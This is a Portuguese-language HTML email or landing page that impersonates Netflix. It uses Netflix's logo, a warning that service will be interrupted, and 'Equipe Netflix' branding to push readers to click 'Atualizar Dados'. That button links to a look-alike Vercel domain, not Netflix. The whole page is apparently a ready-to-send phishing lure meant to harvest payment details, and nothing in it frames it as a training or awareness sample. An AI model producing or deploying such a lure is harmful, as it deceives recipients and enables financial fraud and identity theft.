<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Atualização de Pagamento - Netflix</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
        Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      background-color: #fff;
      color: #1f2937;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      padding: 24px 16px;
    }
    header {
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 16px;
      margin-bottom: 24px;
      text-align: center;
    }
    header img {
      height: 32px;
    }
    .alert {
      background-color: #fef3c7;
      border-left: 4px solid #f59e0b;
      color: #b45309;
      padding: 12px 16px;
      border-radius: 4px;
      font-size: 14px;
      margin-bottom: 24px;
    }
    h1 {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 16px;
      color: #111827;
    }
    p {
      font-size: 16px;
      margin-bottom: 24px;
      color: #374151;
    }
    .cta-button {
      display: block;
      width: 100%;
      background-color: #ef4444;
      color: #fff;
      font-weight: 700;
      padding: 16px 0;
      border-radius: 8px;
      text-align: center;
      text-decoration: none;
      font-size: 18px;
      box-shadow: 0 6px 12px rgba(239, 68, 68, 0.5);
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
      cursor: pointer;
    }
    .cta-button:hover {
      background-color: #dc2626;
      box-shadow: 0 8px 20px rgba(220, 38, 38, 0.7);
    }
    .footer {
      font-size: 12px;
      color: #6b7280;
      margin-top: 32px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" />
    </header>

    <div class="alert">
      <strong>Atenção:</strong> Atualize seus dados de pagamento para evitar a interrupção do serviço.
    </div>

    <h1>Mantenha seu acesso liberado</h1>

    <p>Atualize seus dados de pagamento para continuar assistindo sem interrupções.</p>

    <a href="https://assinatura-netflix-atualizar.vercel.app/" class="cta-button" target="_blank" rel="noopener noreferrer">
      Atualizar Dados
    </a>

    <div class="footer">
      <p>Equipe Netflix</p>
    </div>
  </div>
</body>
</html>
